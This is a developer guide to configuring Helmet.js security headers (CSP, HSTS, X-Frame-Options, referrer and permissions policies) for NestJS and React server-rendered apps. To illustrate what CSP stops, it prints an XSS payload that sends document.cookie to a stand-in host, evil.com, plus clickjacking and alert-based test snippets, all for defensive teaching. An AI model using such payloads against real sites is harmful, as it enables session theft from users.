# Security Headers for SSR Applications

When deploying NestJS + React SSR applications to production, security headers are critical for protecting your users from common web vulnerabilities. This guide explains why security headers matter and how to configure them for SSR applications.

## Why Security Headers Matter

Security headers are HTTP response headers that tell browsers how to behave when handling your site's content. They provide **defense-in-depth** protection against:

- **Cross-Site Scripting (XSS)** - Prevents execution of malicious scripts
- **Clickjacking** - Prevents UI redressing attacks
- **MIME Sniffing** - Prevents content type confusion attacks
- **Information Leakage** - Controls what information browsers share
- **Man-in-the-Middle** - Enforces HTTPS connections

## Recommended: Helmet.js

[Helmet.js](https://helmetjs.github.io/) is the industry-standard security headers middleware for Express/NestJS applications. It's:

- ✅ **Battle-tested** - Millions of downloads, used in production worldwide
- ✅ **Comprehensive** - Sets 11+ security headers automatically
- ✅ **Customizable** - Easy to configure for your specific needs
- ✅ **Maintained** - Actively updated with latest security best practices

### Installation

```bash
pnpm add helmet
```

Note: Helmet v8+ includes its own TypeScript types, no `@types/helmet` needed.

## Configuration for SSR Applications

**IMPORTANT**: SSR applications have unique requirements because they inject inline scripts for hydration data. Default CSP (Content Security Policy) configurations will block these scripts and break your app.

### Basic SSR-Compatible Configuration

```typescript
// src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Configure Helmet with SSR-appropriate settings
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: [
            "'self'",
            // ⚠️ Required for SSR: Allows inline hydration scripts
            // (__INITIAL_STATE__, __COMPONENT_PATH__, __CONTEXT__)
            "'unsafe-inline'",
            // For Vite dev server HMR (development only)
            ...(process.env.NODE_ENV === 'development' ? ["'unsafe-eval'"] : []),
          ],
          styleSrc: [
            "'self'",
            // Required for inline styles (SSR and HMR)
            "'unsafe-inline'",
          ],
          imgSrc: ["'self'", 'data:', 'https:'],
          fontSrc: ["'self'", 'data:'],
          connectSrc: [
            "'self'",
            // For Vite HMR WebSocket (development only)
            ...(process.env.NODE_ENV === 'development'
              ? ['ws://localhost:*', 'ws://127.0.0.1:*']
              : []),
          ],
          objectSrc: ["'none'"],
          upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null,
        },
      },
      // Prevent clickjacking
      frameguard: {
        action: 'deny',
      },
      // Hide Express fingerprinting
      hidePoweredBy: true,
      // Enforce HTTPS (production only)
      hsts: process.env.NODE_ENV === 'production'
        ? {
            maxAge: 31536000, // 1 year
            includeSubDomains: true,
            preload: true,
          }
        : false,
      // Prevent MIME sniffing
      noSniff: true,
      // Privacy-focused referrer policy
      referrerPolicy: {
        policy: 'strict-origin-when-cross-origin',
      },
      // Disable Flash/PDF policies
      permittedCrossDomainPolicies: {
        permittedPolicies: 'none',
      },
    }),
  );

  await app.listen(3000);
}
bootstrap();
```

## Understanding Each Security Header

### 1. Content-Security-Policy (CSP) 🛡️ **Most Important**

**What it does**: Controls which resources (scripts, styles, images, etc.) can be loaded and from where.

**How it protects**:
- **Blocks XSS attacks** - Prevents execution of unauthorized scripts
- **Prevents code injection** - Only trusted sources can load scripts
- **Mitigates data exfiltration** - Controls where data can be sent

**Example attack prevented**:
```html
<!-- Attacker injects this via a form input -->
<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
<!-- CSP blocks the inline script from executing -->
```

**SSR Challenge**: Your application injects inline scripts for hydration:
```html
<script>
  window.__INITIAL_STATE__ = {"user": "data"};
  window.__COMPONENT_PATH__ = "users/profile";
  window.__CONTEXT__ = {/*...*/};
</script>
```

**Solutions**:
1. **`'unsafe-inline'`** (Current approach) - Allows all inline scripts
   - ✅ Simple to implement
   - ❌ Weaker security - allows attacker-injected inline scripts
   - ✅ Good for prototypes and low-risk applications

2. **Nonces** (Production recommendation) - Generate unique token per request
   - ✅ Strong security - only scripts with correct nonce execute
   - ❌ More complex - requires generating/injecting nonces
   - ✅ Used by Next.js, Remix, etc.

3. **Hash-based CSP** - Hash each inline script
   - ✅ Static generation friendly
   - ❌ Complex for dynamic content
   - ✅ Good for mostly-static sites

**Implementing nonces (future enhancement)**:
```typescript
// In your render interceptor
const nonce = crypto.randomBytes(16).toString('base64');

// Set CSP header with nonce
response.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}';`
);

// Inject nonce in HTML
const html = `
  <script nonce="${nonce}">
    window.__INITIAL_STATE__ = ${serialize(data)};
  </script>
`;
```

### 2. X-Frame-Options 🖼️

**What it does**: Prevents your site from being embedded in an iframe.

**How it protects**:
- **Prevents clickjacking** - Attackers can't overlay invisible frames
- **Prevents UI redressing** - Can't trick users into clicking hidden elements

**Example attack prevented**:
```html
<!-- Attacker's malicious site -->
<iframe src="https://yourbank.com/transfer?to=attacker&amount=10000"></iframe>
<!-- Invisible iframe tricks user into clicking "Transfer" -->
```

**Configuration**:
```typescript
frameguard: {
  action: 'deny',  // Never allow framing
  // OR
  action: 'sameorigin',  // Only allow same domain
}
```

**When to allow framing**:
- Embedding your own widgets
- OAuth popups
- Trusted third-party integrations

### 3. X-Content-Type-Options 📄

**What it does**: Prevents browsers from MIME-sniffing responses.

**How it protects**:
- **Prevents MIME confusion** - Browser won't execute `text/plain` as JavaScript
- **Forces correct content types** - Server must send proper `Content-Type` headers

**Example attack prevented**:
```html
<!-- Attacker uploads "image.jpg" that's actually JavaScript -->
<script src="/uploads/user-avatar.jpg"></script>
<!-- Without noSniff, IE/old browsers might execute it -->
```

**Configuration**:
```typescript
noSniff: true,  // Always enabled
```

### 4. Strict-Transport-Security (HSTS) 🔒

**What it does**: Forces browsers to only connect via HTTPS.

**How it protects**:
- **Prevents downgrade attacks** - Can't force users back to HTTP
- **Prevents SSL stripping** - MITM can't remove HTTPS
- **Automatic upgrade** - Browser remembers to use HTTPS

**Example**:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Once set, browser will **only** connect via HTTPS for 1 year.

**Configuration**:
```typescript
hsts: process.env.NODE_ENV === 'production'
  ? {
      maxAge: 31536000,      // 1 year (required minimum for preload)
      includeSubDomains: true,
      preload: true,         // Submit to HSTS preload list
    }
  : false,  // Disabled in development (localhost uses HTTP)
```

**⚠️ Warning**: Don't enable HSTS until you're **sure** HTTPS works correctly. Once enabled, users can't access your site via HTTP even if HTTPS breaks.

**HSTS Preload**: Submit your domain to [hstspreload.org](https://hstspreload.org/) to be hardcoded into browsers.

### 5. Referrer-Policy 🔗

**What it does**: Controls how much referrer information browsers send when navigating away from your site.

**How it protects**:
- **Privacy** - Doesn't leak full URLs with sensitive data
- **Security** - Prevents exposing tokens in query strings

**Example**:
```
User visits: https://yourapp.com/reset-password?token=secret123
User clicks external link → Without policy, "secret123" leaks to external site
```

**Recommended policy**:
```typescript
referrerPolicy: {
  policy: 'strict-origin-when-cross-origin',
}
```

**Behavior**:
- **Same origin**: Full URL sent
- **HTTPS → HTTPS**: Origin only (`https://yourapp.com`)
- **HTTPS → HTTP**: Nothing sent
- **HTTP → Any**: Origin only

**Other policies**:
- `no-referrer` - Never send referrer (breaks analytics)
- `same-origin` - Only send to same origin
- `strict-origin` - Only send origin, not full URL

### 6. Permissions-Policy (Feature-Policy) 🎛️

**What it does**: Controls which browser features can be used.

**How it protects**:
- **Limits attack surface** - Disable unused features
- **Privacy** - Blocks camera, microphone, geolocation
- **Performance** - Disables sync-xhr, etc.

**Example**:
```typescript
// Helmet doesn't set this by default, but you can add it:
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=()'
  );
  next();
});
```

**Benefits**:
- Even if XSS occurs, attacker can't access camera/microphone
- Prevents third-party scripts from using sensitive features

### 7. Cross-Origin-* Headers 🌐

**What they do**: Control how your resources interact with other origins.

**Cross-Origin-Opener-Policy (COOP)**:
```
Cross-Origin-Opener-Policy: same-origin
```
- Prevents other windows from accessing your window object
- Enables `SharedArrayBuffer` and high-precision timers

**Cross-Origin-Resource-Policy (CORP)**:
```
Cross-Origin-Resource-Policy: same-origin
```
- Prevents other sites from embedding your resources
- Protects against Spectre-style attacks

**Cross-Origin-Embedder-Policy (COEP)**:
```
Cross-Origin-Embedder-Policy: require-corp
```
- Requires all embedded resources to opt-in via CORS
- Needed for cross-origin isolation

## Testing Security Headers

### 1. Manual Testing

```bash
# Check headers
curl -I https://yourapp.com

# Look for:
# Content-Security-Policy: ...
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Strict-Transport-Security: ...
# Referrer-Policy: ...
```

### 2. Automated Tools

**Security Headers**:
- [securityheaders.com](https://securityheaders.com/) - Scan your site, get grade A-F
- [Mozilla Observatory](https://observatory.mozilla.org/) - Comprehensive security scan

**CSP Testing**:
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Analyze your CSP
- Browser DevTools → Console - Shows CSP violations

**Example CSP violation**:
```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self'"
```

### 3. Penetration Testing

Test that headers actually prevent attacks:

**Clickjacking test**:
```html
<!-- Try embedding your site -->
<iframe src="https://yourapp.com"></iframe>
<!-- Should be blocked if X-Frame-Options is working -->
```

**XSS test** (in development only!):
```html
<!-- Try injecting script -->
<img src=x onerror="alert('XSS')">
<!-- CSP should block execution -->
```

## Best Practices

### 1. Start with Strict Policies, Loosen as Needed

```typescript
// Start strict
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    // ... everything blocked by default
  }
}

// Then add exceptions based on actual needs
scriptSrc: ["'self'", "'unsafe-inline'"],  // For SSR
```

### 2. Monitor CSP Violations

Configure CSP reporting to catch violations in production:

```typescript
contentSecurityPolicy: {
  directives: {
    // ... your directives
    reportUri: '/csp-violation-report',
  }
}
```

Create endpoint to receive reports:
```typescript
@Post('/csp-violation-report')
cspViolation(@Body() report: any) {
  console.error('CSP Violation:', report);
  // Send to monitoring service (Sentry, etc.)
}
```

### 3. Environment-Specific Configuration

```typescript
const isDevelopment = process.env.NODE_ENV === 'development';
const isProduction = process.env.NODE_ENV === 'production';

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        scriptSrc: [
          "'self'",
          "'unsafe-inline'",  // Always needed for SSR
          ...(isDevelopment ? ["'unsafe-eval'"] : []),  // HMR only
        ],
        connectSrc: [
          "'self'",
          ...(isDevelopment ? ['ws://localhost:*'] : []),  // HMR WebSocket
        ],
      },
    },
    hsts: isProduction && {  // HTTPS only in production
      maxAge: 31536000,
      includeSubDomains: true,
    },
  }),
);
```

### 4. Document Your CSP Exceptions

```typescript
contentSecurityPolicy: {
  directives: {
    scriptSrc: [
      "'self'",
      // Required: SSR hydration scripts inject __INITIAL_STATE__
      "'unsafe-inline'",
      // Required: Google Analytics
      'https://www.googletagmanager.com',
      // Required: Stripe checkout
      'https://js.stripe.com',
    ],
  }
}
```

### 5. Regular Security Audits

- Run [securityheaders.com](https://securityheaders.com/) monthly
- Review CSP violations weekly
- Update Helmet.js regularly (`pnpm update helmet`)
- Subscribe to security advisories

## Common Pitfalls

### ❌ Blocking Your Own App

**Problem**: CSP too strict, blocks hydration scripts
**Solution**: Add `'unsafe-inline'` or use nonces

**Problem**: X-Frame-Options blocks OAuth popups
**Solution**: Use `SAMEORIGIN` instead of `DENY`, or remove for specific routes

### ❌ HSTS Locking Out Users

**Problem**: Enabled HSTS but HTTPS doesn't work
**Solution**: Test HTTPS thoroughly before enabling HSTS
**Recovery**: Wait for `max-age` to expire (can be months!)

### ❌ Breaking Third-Party Integrations

**Problem**: CSP blocks Google Analytics, Stripe, etc.
**Solution**: Add trusted domains to CSP whitelist

```typescript
scriptSrc: [
  "'self'",
  'https://www.googletagmanager.com',
  'https://js.stripe.com',
],
```

### ❌ Development vs Production Mismatches

**Problem**: Works in dev, breaks in production
**Solution**: Test production build locally with `NODE_ENV=production`

## Migration Guide: Adding Helmet to Existing App

1. **Install Helmet**
   ```bash
   pnpm add helmet
   ```

2. **Add basic configuration** (permissive)
   ```typescript
   app.use(helmet({
     contentSecurityPolicy: false,  // Disabled initially
   }));
   ```

3. **Test that app still works**
   ```bash
   curl -I http://localhost:3000
   # Should see security headers except CSP
   ```

4. **Enable CSP in report-only mode**
   ```typescript
   contentSecurityPolicy: {
     directives: { /* ... */ },
     reportOnly: true,  // Don't block, just report
   }
   ```

5. **Monitor violations, fix issues**

6. **Enable enforcement**
   ```typescript
   contentSecurityPolicy: {
     directives: { /* ... */ },
     reportOnly: false,  // Now enforced
   }
   ```

## When NOT to Use Helmet

- **API-only services** - JSON APIs don't need CSP
- **Serverless functions** - Often deployed behind API gateways that add headers
- **Static file servers** - Use CDN/nginx headers instead

## Production Deployment Checklist

- [ ] Helmet installed and configured
- [ ] CSP tested and violations resolved
- [ ] HSTS enabled with correct `max-age`
- [ ] Security headers verified with [securityheaders.com](https://securityheaders.com/)
- [ ] Grade A or A+ achieved
- [ ] CSP reporting endpoint configured
- [ ] Environment-specific config tested (dev vs production)
- [ ] Third-party integrations whitelisted in CSP
- [ ] No `'unsafe-eval'` in production CSP

## Further Reading

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Helmet.js Documentation](https://helmetjs.github.io/)
- [CSP Is Dead, Long Live CSP!](https://research.google/pubs/pub45542/) - Google's research on CSP

## Summary

Security headers are **critical** for production web applications. They provide defense-in-depth protection against common attacks with minimal performance overhead.

**Minimum recommendation**:
- ✅ Use Helmet.js with SSR-appropriate CSP
- ✅ Test with [securityheaders.com](https://securityheaders.com/)
- ✅ Aim for grade A or better
- ✅ Monitor CSP violations in production
- ✅ Update regularly and audit security posture

**Remember**: Security headers are just **one layer** of defense. Always validate input, sanitize output, use HTTPS, keep dependencies updated, and follow OWASP best practices.
